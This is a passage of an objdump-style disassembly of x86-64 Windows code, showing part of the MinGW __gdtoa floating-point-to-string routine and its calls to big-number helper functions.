   1400067d5:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   1400067dc:	00 
   1400067dd:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   1400067e4:	00 
   1400067e5:	e9 3a 01 00 00       	jmp    140006924 <__gdtoa+0x3d4>
   1400067ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400067f0:	45 31 ff             	xor    %r15d,%r15d
   1400067f3:	83 f8 04             	cmp    $0x4,%eax
   1400067f6:	75 65                	jne    14000685d <__gdtoa+0x30d>
   1400067f8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400067fd:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140006802:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140006808:	48 8d 0d 3a 4f 00 00 	lea    0x4f3a(%rip),%rcx        # 14000b749 <.rdata+0x9>
   14000680f:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140006815:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   14000681c:	5b                   	pop    %rbx
   14000681d:	5e                   	pop    %rsi
   14000681e:	5f                   	pop    %rdi
   14000681f:	5d                   	pop    %rbp
   140006820:	41 5c                	pop    %r12
   140006822:	41 5d                	pop    %r13
   140006824:	41 5e                	pop    %r14
   140006826:	41 5f                	pop    %r15
   140006828:	e9 f3 fa ff ff       	jmp    140006320 <__nrv_alloc_D2A>
   14000682d:	0f 1f 00             	nopl   (%rax)
   140006830:	48 89 f1             	mov    %rsi,%rcx
   140006833:	e8 08 1a 00 00       	call   140008240 <__Bfree_D2A>
   140006838:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000683d:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140006842:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006848:	48 8d 0d fe 4e 00 00 	lea    0x4efe(%rip),%rcx        # 14000b74d <.rdata+0xd>
   14000684f:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140006855:	e8 c6 fa ff ff       	call   140006320 <__nrv_alloc_D2A>
   14000685a:	49 89 c7             	mov    %rax,%r15
   14000685d:	4c 89 f8             	mov    %r15,%rax
   140006860:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140006867:	5b                   	pop    %rbx
   140006868:	5e                   	pop    %rsi
   140006869:	5f                   	pop    %rdi
   14000686a:	5d                   	pop    %rbp
   14000686b:	41 5c                	pop    %r12
   14000686d:	41 5d                	pop    %r13
   14000686f:	41 5e                	pop    %r14
   140006871:	41 5f                	pop    %r15
   140006873:	c3                   	ret
   140006874:	0f 1f 40 00          	nopl   0x0(%rax)
   140006878:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000687d:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140006882:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140006888:	48 8d 0d b1 4e 00 00 	lea    0x4eb1(%rip),%rcx        # 14000b740 <.rdata>
   14000688f:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140006895:	e9 7b ff ff ff       	jmp    140006815 <__gdtoa+0x2c5>
   14000689a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400068a0:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%rsi)
   1400068a7:	e9 d8 fd ff ff       	jmp    140006684 <__gdtoa+0x134>
   1400068ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400068b0:	89 c2                	mov    %eax,%edx
   1400068b2:	48 89 f1             	mov    %rsi,%rcx
   1400068b5:	e8 26 16 00 00       	call   140007ee0 <__rshift_D2A>
   1400068ba:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
   1400068c1:	8b 54 24 38          	mov    0x38(%rsp),%edx
   1400068c5:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   1400068c8:	41 29 c6             	sub    %eax,%r14d
   1400068cb:	89 4c 24 58          	mov    %ecx,0x58(%rsp)
   1400068cf:	e9 cf fd ff ff       	jmp    1400066a3 <__gdtoa+0x153>
   1400068d4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400068d8:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   1400068df:	00 
   1400068e0:	44 8b 54 24 54       	mov    0x54(%rsp),%r10d
   1400068e5:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   1400068ec:	00 
   1400068ed:	45 85 d2             	test   %r10d,%r10d
   1400068f0:	79 13                	jns    140006905 <__gdtoa+0x3b5>
   1400068f2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400068f7:	c7 44 24 54 00 00 00 	movl   $0x0,0x54(%rsp)
   1400068fe:	00 
   1400068ff:	29 c2                	sub    %eax,%edx
   140006901:	89 54 24 60          	mov    %edx,0x60(%rsp)
   140006905:	45 85 db             	test   %r11d,%r11d
   140006908:	0f 89 c2 08 00 00    	jns    1400071d0 <__gdtoa+0xc80>
   14000690e:	44 89 d8             	mov    %r11d,%eax
   140006911:	44 29 5c 24 60       	sub    %r11d,0x60(%rsp)
   140006916:	f7 d8                	neg    %eax
   140006918:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
   14000691f:	00 
   140006920:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140006924:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006928:	83 f8 09             	cmp    $0x9,%eax
   14000692b:	0f 87 2f 02 00 00    	ja     140006b60 <__gdtoa+0x610>
   140006931:	83 f8 05             	cmp    $0x5,%eax
   140006934:	0f 8f d6 03 00 00    	jg     140006d10 <__gdtoa+0x7c0>
   14000693a:	41 81 c0 fd 03 00 00 	add    $0x3fd,%r8d
   140006941:	31 c0                	xor    %eax,%eax
   140006943:	41 81 f8 f7 07 00 00 	cmp    $0x7f7,%r8d
   14000694a:	0f 96 c0             	setbe  %al
   14000694d:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   140006954:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006958:	83 f8 04             	cmp    $0x4,%eax
   14000695b:	0f 84 24 08 00 00    	je     140007185 <__gdtoa+0xc35>
   140006961:	83 f8 05             	cmp    $0x5,%eax
   140006964:	0f 84 9c 0d 00 00    	je     140007706 <__gdtoa+0x11b6>
   14000696a:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
   140006971:	00 00 00 00 
   140006975:	83 f8 02             	cmp    $0x2,%eax
   140006978:	0f 84 12 08 00 00    	je     140007190 <__gdtoa+0xc40>
   14000697e:	83 f8 03             	cmp    $0x3,%eax
   140006981:	0f 85 e1 01 00 00    	jne    140006b68 <__gdtoa+0x618>
   140006987:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000698b:	44 89 5c 24 64       	mov    %r11d,0x64(%rsp)
   140006990:	44 01 d8             	add    %r11d,%eax
   140006993:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140006997:	83 c0 01             	add    $0x1,%eax
   14000699a:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000699e:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   1400069a5:	85 c0                	test   %eax,%eax
   1400069a7:	0f 8e 33 0c 00 00    	jle    1400075e0 <__gdtoa+0x1090>
   1400069ad:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   1400069b1:	e8 2a f9 ff ff       	call   1400062e0 <__rv_alloc_D2A>
   1400069b6:	44 8b 5c 24 64       	mov    0x64(%rsp),%r11d
   1400069bb:	49 89 c7             	mov    %rax,%r15
   1400069be:	41 8b 4d 0c          	mov    0xc(%r13),%ecx
   1400069c2:	83 e9 01             	sub    $0x1,%ecx
   1400069c5:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   1400069c9:	74 22                	je     1400069ed <__gdtoa+0x49d>
   1400069cb:	b8 02 00 00 00       	mov    $0x2,%eax
   1400069d0:	0f 49 c1             	cmovns %ecx,%eax
   1400069d3:	83 e5 08             	and    $0x8,%ebp
   1400069d6:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1400069da:	89 c2                	mov    %eax,%edx
   1400069dc:	0f 84 a6 06 00 00    	je     140007088 <__gdtoa+0xb38>
   1400069e2:	b8 03 00 00 00       	mov    $0x3,%eax
   1400069e7:	29 d0                	sub    %edx,%eax
   1400069e9:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1400069ed:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   1400069f1:	0f b6 ac 24 88 00 00 	movzbl 0x88(%rsp),%ebp
   1400069f8:	00 
   1400069f9:	83 f9 0e             	cmp    $0xe,%ecx
   1400069fc:	0f 96 c0             	setbe  %al
   1400069ff:	40 20 c5             	and    %al,%bpl
   140006a02:	0f 84 80 06 00 00    	je     140007088 <__gdtoa+0xb38>
   140006a08:	8b 44 24 64          	mov    0x64(%rsp),%eax
   140006a0c:	44 09 d8             	or     %r11d,%eax
   140006a0f:	0f 85 73 06 00 00    	jne    140007088 <__gdtoa+0xb38>
   140006a15:	c7 84 24 9c 00 00 00 	movl   $0x0,0x9c(%rsp)
   140006a1c:	00 00 00 00 
   140006a20:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   140006a25:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140006a2c:	00 00 
   140006a2e:	45 85 c0             	test   %r8d,%r8d
   140006a31:	74 12                	je     140006a45 <__gdtoa+0x4f5>
   140006a33:	f2 0f 10 25 45 4d 00 	movsd  0x4d45(%rip),%xmm4        # 14000b780 <.rdata+0x40>
   140006a3a:	00 
   140006a3b:	66 0f 2f e0          	comisd %xmm0,%xmm4
   140006a3f:	0f 87 da 05 00 00    	ja     14000701f <__gdtoa+0xacf>
   140006a45:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140006a49:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   140006a4d:	f2 0f 58 0d 33 4d 00 	addsd  0x4d33(%rip),%xmm1        # 14000b788 <.rdata+0x48>
   140006a54:	00 
   140006a55:	66 48 0f 7e c8       	movq   %xmm1,%rax
   140006a5a:	48 89 c2             	mov    %rax,%rdx
   140006a5d:	89 c0                	mov    %eax,%eax
   140006a5f:	48 c1 ea 20          	shr    $0x20,%rdx
   140006a63:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   140006a69:	48 c1 e2 20          	shl    $0x20,%rdx
   140006a6d:	48 09 d0             	or     %rdx,%rax
   140006a70:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140006a74:	85 d2                	test   %edx,%edx
   140006a76:	0f 84 d6 05 00 00    	je     140007052 <__gdtoa+0xb02>
   140006a7c:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140006a83:	00 
   140006a84:	44 8b 54 24 48       	mov    0x48(%rsp),%r10d
   140006a89:	4c 8b 0d d0 4f 00 00 	mov    0x4fd0(%rip),%r9        # 14000ba60 <.refptr.__tens_D2A>
   140006a90:	66 48 0f 6e d0       	movq   %rax,%xmm2
   140006a95:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   140006a99:	48 98                	cltq
   140006a9b:	f2 41 0f 10 1c c1    	movsd  (%r9,%rax,8),%xmm3
   140006aa1:	8b 84 24 8c 00 00 00 	mov    0x8c(%rsp),%eax
   140006aa8:	85 c0                	test   %eax,%eax
   140006aaa:	0f 84 2f 0e 00 00    	je     1400078df <__gdtoa+0x138f>
   140006ab0:	f2 0f 10 0d 08 4d 00 	movsd  0x4d08(%rip),%xmm1        # 14000b7c0 <.rdata+0x80>
   140006ab7:	00 
   140006ab8:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
   140006abc:	49 8d 47 01          	lea    0x1(%r15),%rax
   140006ac0:	f2 0f 5e cb          	divsd  %xmm3,%xmm1
   140006ac4:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   140006ac8:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140006acc:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
   140006ad0:	83 c2 30             	add    $0x30,%edx
   140006ad3:	41 88 17             	mov    %dl,(%r15)
   140006ad6:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   140006ada:	66 0f 2f c8          	comisd %xmm0,%xmm1
   140006ade:	0f 87 32 12 00 00    	ja     140007d16 <__gdtoa+0x17c6>
   140006ae4:	f2 0f 10 25 94 4c 00 	movsd  0x4c94(%rip),%xmm4        # 14000b780 <.rdata+0x40>
   140006aeb:	00 
   140006aec:	f2 0f 10 1d 9c 4c 00 	movsd  0x4c9c(%rip),%xmm3        # 14000b790 <.rdata+0x50>
   140006af3:	00 
   140006af4:	eb 50                	jmp    140006b46 <__gdtoa+0x5f6>
   140006af6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140006afd:	00 00 00 
   140006b00:	8b 94 24 9c 00 00 00 	mov    0x9c(%rsp),%edx
   140006b07:	83 c2 01             	add    $0x1,%edx
   140006b0a:	89 94 24 9c 00 00 00 	mov    %edx,0x9c(%rsp)
   140006b11:	44 39 d2             	cmp    %r10d,%edx
   140006b14:	0f 8d 29 12 00 00    	jge    140007d43 <__gdtoa+0x17f3>
   140006b1a:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
   140006b1e:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140006b22:	48 83 c0 01          	add    $0x1,%rax
   140006b26:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
   140006b2a:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
   140006b2e:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
   140006b32:	83 c2 30             	add    $0x30,%edx
   140006b35:	88 50 ff             	mov    %dl,-0x1(%rax)
   140006b38:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   140006b3c:	66 0f 2f c8          	comisd %xmm0,%xmm1
   140006b40:	0f 87 d0 11 00 00    	ja     140007d16 <__gdtoa+0x17c6>
   140006b46:	66 0f 28 d4          	movapd %xmm4,%xmm2
   140006b4a:	f2 0f 5c d0          	subsd  %xmm0,%xmm2
   140006b4e:	66 0f 2f ca          	comisd %xmm2,%xmm1
   140006b52:	76 ac                	jbe    140006b00 <__gdtoa+0x5b0>
   140006b54:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   140006b58:	e9 63 01 00 00       	jmp    140006cc0 <__gdtoa+0x770>
   140006b5d:	0f 1f 00             	nopl   (%rax)
   140006b60:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140006b67:	00 
   140006b68:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006b6c:	44 89 5c 24 40       	mov    %r11d,0x40(%rsp)
   140006b71:	f2 41 0f 2a c4       	cvtsi2sd %r12d,%xmm0
   140006b76:	f2 0f 59 05 fa 4b 00 	mulsd  0x4bfa(%rip),%xmm0        # 14000b778 <.rdata+0x38>
   140006b7d:	00 
   140006b7e:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
   140006b82:	83 c1 03             	add    $0x3,%ecx
   140006b85:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
   140006b8c:	e8 4f f7 ff ff       	call   1400062e0 <__rv_alloc_D2A>
   140006b91:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   140006b96:	44 8b 5c 24 40       	mov    0x40(%rsp),%r11d
   140006b9b:	49 89 c7             	mov    %rax,%r15
   140006b9e:	45 85 c9             	test   %r9d,%r9d
   140006ba1:	0f 88 c2 01 00 00    	js     140006d69 <__gdtoa+0x819>
   140006ba7:	45 39 5d 14          	cmp    %r11d,0x14(%r13)
   140006bab:	0f 8c b8 01 00 00    	jl     140006d69 <__gdtoa+0x819>
   140006bb1:	48 8b 15 a8 4e 00 00 	mov    0x4ea8(%rip),%rdx        # 14000ba60 <.refptr.__tens_D2A>
   140006bb8:	49 63 c3             	movslq %r11d,%rax
   140006bbb:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140006bc2:	00 
   140006bc3:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   140006bca:	ff 
   140006bcb:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   140006bd0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140006bd7:	00 00 
   140006bd9:	41 8d 7b 01          	lea    0x1(%r11),%edi
   140006bdd:	49 8d 47 01          	lea    0x1(%r15),%rax
   140006be1:	c7 84 24 9c 00 00 00 	movl   $0x1,0x9c(%rsp)
   140006be8:	01 00 00 00 
   140006bec:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140006bf0:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140006bf4:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   140006bf8:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
   140006bfc:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006c00:	f2 0f 2a ca          	cvtsi2sd %edx,%xmm1
   140006c04:	8d 4a 30             	lea    0x30(%rdx),%ecx
   140006c07:	41 88 0f             	mov    %cl,(%r15)
   140006c0a:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   140006c0e:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   140006c12:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006c16:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   140006c1a:	7a 06                	jp     140006c22 <__gdtoa+0x6d2>
   140006c1c:	0f 84 ac 03 00 00    	je     140006fce <__gdtoa+0xa7e>
   140006c22:	f2 0f 10 25 66 4b 00 	movsd  0x4b66(%rip),%xmm4        # 14000b790 <.rdata+0x50>
   140006c29:	00 
   140006c2a:	66 0f ef db          	pxor   %xmm3,%xmm3
   140006c2e:	eb 40                	jmp    140006c70 <__gdtoa+0x720>
   140006c30:	f2 0f 59 c4          	mulsd  %xmm4,%xmm0
   140006c34:	83 c1 01             	add    $0x1,%ecx
   140006c37:	48 83 c0 01          	add    $0x1,%rax
   140006c3b:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
   140006c42:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140006c46:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   140006c4a:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
   140006c4e:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006c52:	f2 0f 2a ca          	cvtsi2sd %edx,%xmm1
   140006c56:	8d 4a 30             	lea    0x30(%rdx),%ecx
   140006c59:	88 48 ff             	mov    %cl,-0x1(%rax)
   140006c5c:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   140006c60:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   140006c64:	66 0f 2e c3          	ucomisd %xmm3,%xmm0
   140006c68:	7a 06                	jp     140006c70 <__gdtoa+0x720>
   140006c6a:	0f 84 5e 03 00 00    	je     140006fce <__gdtoa+0xa7e>
   140006c70:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
   140006c77:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   140006c7b:	39 f9                	cmp    %edi,%ecx
   140006c7d:	75 b1                	jne    140006c30 <__gdtoa+0x6e0>
   140006c7f:	8b 7c 24 64          	mov    0x64(%rsp),%edi
   140006c83:	85 ff                	test   %edi,%edi
   140006c85:	0f 84 57 10 00 00    	je     140007ce2 <__gdtoa+0x1792>
   140006c8b:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140006c92:	00 
   140006c93:	83 ff 01             	cmp    $0x1,%edi
   140006c96:	0f 85 32 03 00 00    	jne    140006fce <__gdtoa+0xa7e>
   140006c9c:	44 89 5c 24 64       	mov    %r11d,0x64(%rsp)
   140006ca1:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   140006ca5:	eb 19                	jmp    140006cc0 <__gdtoa+0x770>
   140006ca7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140006cae:	00 00 
   140006cb0:	4c 39 f9             	cmp    %r15,%rcx
   140006cb3:	0f 84 07 0f 00 00    	je     140007bc0 <__gdtoa+0x1670>
   140006cb9:	0f b6 51 ff          	movzbl -0x1(%rcx),%edx
   140006cbd:	48 89 c8             	mov    %rcx,%rax
   140006cc0:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   140006cc4:	80 fa 39             	cmp    $0x39,%dl
   140006cc7:	74 e7                	je     140006cb0 <__gdtoa+0x760>
   140006cc9:	8b 7c 24 64          	mov    0x64(%rsp),%edi
   140006ccd:	83 c2 01             	add    $0x1,%edx
   140006cd0:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140006cd7:	00 
   140006cd8:	88 11                	mov    %dl,(%rcx)
   140006cda:	83 c7 01             	add    $0x1,%edi
   140006cdd:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140006ce1:	e9 e8 02 00 00       	jmp    140006fce <__gdtoa+0xa7e>
   140006ce6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140006ced:	00 00 00 
   140006cf0:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006cf4:	f2 41 0f 2a cb       	cvtsi2sd %r11d,%xmm1
   140006cf9:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
   140006cfd:	7a 06                	jp     140006d05 <__gdtoa+0x7b5>
   140006cff:	0f 84 5f fa ff ff    	je     140006764 <__gdtoa+0x214>
   140006d05:	41 83 eb 01          	sub    $0x1,%r11d
   140006d09:	e9 56 fa ff ff       	jmp    140006764 <__gdtoa+0x214>
   140006d0e:	66 90                	xchg   %ax,%ax
   140006d10:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%rsp)
   140006d17:	00 00 00 00 
   140006d1b:	83 e8 04             	sub    $0x4,%eax
   140006d1e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006d22:	83 f8 04             	cmp    $0x4,%eax
   140006d25:	0f 84 5a 04 00 00    	je     140007185 <__gdtoa+0xc35>
   140006d2b:	83 f8 05             	cmp    $0x5,%eax
   140006d2e:	0f 84 d2 09 00 00    	je     140007706 <__gdtoa+0x11b6>
   140006d34:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
   140006d3b:	00 00 00 00 
   140006d3f:	83 f8 02             	cmp    $0x2,%eax
   140006d42:	0f 84 48 04 00 00    	je     140007190 <__gdtoa+0xc40>
   140006d48:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140006d4f:	00 
   140006d50:	e9 32 fc ff ff       	jmp    140006987 <__gdtoa+0x437>
   140006d55:	0f 1f 00             	nopl   (%rax)
   140006d58:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%rsp)
   140006d5f:	00 
   140006d60:	41 83 eb 01          	sub    $0x1,%r11d
   140006d64:	e9 77 fb ff ff       	jmp    1400068e0 <__gdtoa+0x390>
   140006d69:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140006d6d:	45 29 f4             	sub    %r14d,%r12d
   140006d70:	41 8b 45 04          	mov    0x4(%r13),%eax
   140006d74:	41 8d 54 24 01       	lea    0x1(%r12),%edx
   140006d79:	44 29 e1             	sub    %r12d,%ecx
   140006d7c:	89 94 24 9c 00 00 00 	mov    %edx,0x9c(%rsp)
   140006d83:	39 c8                	cmp    %ecx,%eax
   140006d85:	0f 8e 15 0b 00 00    	jle    1400078a0 <__gdtoa+0x1350>
   140006d8b:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140006d92:	00 
   140006d93:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   140006d9a:	00 
   140006d9b:	c7 44 24 78 ff ff ff 	movl   $0xffffffff,0x78(%rsp)
   140006da2:	ff 
   140006da3:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   140006daa:	ff 
   140006dab:	8b 54 24 58          	mov    0x58(%rsp),%edx
   140006daf:	44 8b 54 24 48       	mov    0x48(%rsp),%r10d
   140006db4:	29 c2                	sub    %eax,%edx
   140006db6:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140006dbb:	0f 9f c1             	setg   %cl
   140006dbe:	45 85 d2             	test   %r10d,%r10d
   140006dc1:	8d 42 01             	lea    0x1(%rdx),%eax
   140006dc4:	0f 9f c2             	setg   %dl
   140006dc7:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140006dce:	84 d1                	test   %dl,%cl
   140006dd0:	74 09                	je     140006ddb <__gdtoa+0x88b>
   140006dd2:	44 39 d0             	cmp    %r10d,%eax
   140006dd5:	0f 8f f5 0f 00 00    	jg     140007dd0 <__gdtoa+0x1880>
   140006ddb:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   140006ddf:	01 44 24 54          	add    %eax,0x54(%rsp)
   140006de3:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
   140006de8:	01 c8                	add    %ecx,%eax
   140006dea:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
   140006df1:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140006df5:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006dfa:	44 89 5c 24 58       	mov    %r11d,0x58(%rsp)
   140006dff:	e8 6c 15 00 00       	call   140008370 <__i2b_D2A>
   140006e04:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
   140006e0b:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   140006e10:	48 89 c5             	mov    %rax,%rbp
   140006e13:	85 d2                	test   %edx,%edx
   140006e15:	74 34                	je     140006e4b <__gdtoa+0x8fb>
   140006e17:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140006e1b:	85 c0                	test   %eax,%eax
   140006e1d:	7e 2c                	jle    140006e4b <__gdtoa+0x8fb>
   140006e1f:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
   140006e26:	8b 4c 24 54          	mov    0x54(%rsp),%ecx
   140006e2a:	39 ca                	cmp    %ecx,%edx
   140006e2c:	89 c8                	mov    %ecx,%eax
   140006e2e:	0f 4e c2             	cmovle %edx,%eax
   140006e31:	29 44 24 60          	sub    %eax,0x60(%rsp)
   140006e35:	29 c2                	sub    %eax,%edx
   140006e37:	29 c1                	sub    %eax,%ecx
   140006e39:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140006e40:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   140006e47:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   140006e4b:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140006e4f:	85 c0                	test   %eax,%eax
   140006e51:	0f 85 37 08 00 00    	jne    14000768e <__gdtoa+0x113e>
   140006e57:	c7 44 24 68 01 00 00 	movl   $0x1,0x68(%rsp)
   140006e5e:	00 
   140006e5f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006e64:	44 89 5c 24 58       	mov    %r11d,0x58(%rsp)
   140006e69:	e8 02 15 00 00       	call   140008370 <__i2b_D2A>
   140006e6e:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140006e73:	44 8b 54 24 70       	mov    0x70(%rsp),%r10d
   140006e78:	41 0f 9e c4          	setle  %r12b
   140006e7c:	41 83 fe 01          	cmp    $0x1,%r14d
   140006e80:	49 89 c1             	mov    %rax,%r9
   140006e83:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   140006e88:	0f 94 c0             	sete   %al
   140006e8b:	41 21 c4             	and    %eax,%r12d
   140006e8e:	45 85 d2             	test   %r10d,%r10d
   140006e91:	0f 85 09 07 00 00    	jne    1400075a0 <__gdtoa+0x1050>
   140006e97:	45 84 e4             	test   %r12b,%r12b
   140006e9a:	0f 85 e7 0b 00 00    	jne    140007a87 <__gdtoa+0x1537>
   140006ea0:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   140006ea6:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140006eaa:	41 29 c4             	sub    %eax,%r12d
   140006ead:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140006eb1:	41 83 ec 04          	sub    $0x4,%r12d
   140006eb5:	41 83 e4 1f          	and    $0x1f,%r12d
   140006eb9:	44 01 e0             	add    %r12d,%eax
   140006ebc:	44 89 a4 24 9c 00 00 	mov    %r12d,0x9c(%rsp)
   140006ec3:	00 
   140006ec4:	44 89 e2             	mov    %r12d,%edx
   140006ec7:	85 c0                	test   %eax,%eax
   140006ec9:	7e 28                	jle    140006ef3 <__gdtoa+0x9a3>
   140006ecb:	89 c2                	mov    %eax,%edx
   140006ecd:	48 89 f1             	mov    %rsi,%rcx
   140006ed0:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140006ed5:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140006eda:	e8 21 18 00 00       	call   140008700 <__lshift_D2A>
   140006edf:	4c 8b 4c 24 58       	mov    0x58(%rsp),%r9
   140006ee4:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
   140006ee9:	8b 94 24 9c 00 00 00 	mov    0x9c(%rsp),%edx
   140006ef0:	48 89 c6             	mov    %rax,%rsi
   140006ef3:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140006ef7:	01 d0                	add    %edx,%eax
   140006ef9:	89 c2                	mov    %eax,%edx
   140006efb:	85 c0                	test   %eax,%eax
   140006efd:	7e 15                	jle    140006f14 <__gdtoa+0x9c4>
   140006eff:	4c 89 c9             	mov    %r9,%rcx
   140006f02:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140006f07:	e8 f4 17 00 00       	call   140008700 <__lshift_D2A>
   140006f0c:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
